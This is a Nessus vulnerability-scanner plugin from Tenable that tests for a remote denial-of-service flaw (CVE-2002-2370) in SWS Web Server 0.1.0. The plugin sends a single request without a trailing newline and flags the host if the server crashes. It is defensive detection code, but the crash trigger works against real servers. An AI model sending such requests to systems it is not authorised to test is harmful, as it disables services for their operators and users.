#
# (C) Tenable Network Security, Inc.
#

# Modifications by rd:
#	- Removed the numerous (and slow) calls to send() and recv()
#	  because the original exploit states that sending just one
#	  request will crash the server
#
########################
# References:
########################
#
# Message-Id: <200209021802.g82I2Vd48012@mailserver4.hushmail.com>
# Date: Mon, 2 Sep 2002 11:02:31 -0700
# To: vulnwatch@vulnwatch.org
# From: saman@hush.com
# Subject: [VulnWatch] SWS Web Server v0.1.0 Exploit
#
########################
#
# Vulnerable:
# SWS Web Server v0.1.0
#

include("compat.inc");

if(description)
{
 script_id(11171);
 script_version("$Revision: 1.23 $");

 script_cve_id("CVE-2002-2370");
 script_bugtraq_id(5664);
 script_osvdb_id(55111);
 
 script_name(english:"SWS Web Server Unfinished Line Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is prone to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The SWS web server running on this port crashes when it receives a
request that doesn't end in a newline. 

An unauthenticated, remote attacker can exploit this vulnerability to
disable the service." );
 # https://web.archive.org/web/20111004151520/http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0100.html
 script_set_attribute(
  attribute:"see_also", 
  value:"http://www.nessus.org/u?38653668"
 );
 script_set_attribute(attribute:"solution", value: "Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(
  attribute:"vuln_publication_date", 
  value:"2002/09/02"
 );
 script_set_attribute(
  attribute:"plugin_publication_date", 
  value:"2002/11/27"
 );
 script_cvs_date("$Date: 2016/11/17 15:15:44 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_summary(english:"SWS web server crashes when unfinished line is sent");
 script_category(ACT_DENIAL);

 script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www",80);
 exit(0);
}

#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if(http_is_dead(port:port))exit(0);

r = http_send_recv_buf(port: port, data:"|Nessus|");
if(http_is_dead(port:port, retry:3)) security_warning(port);
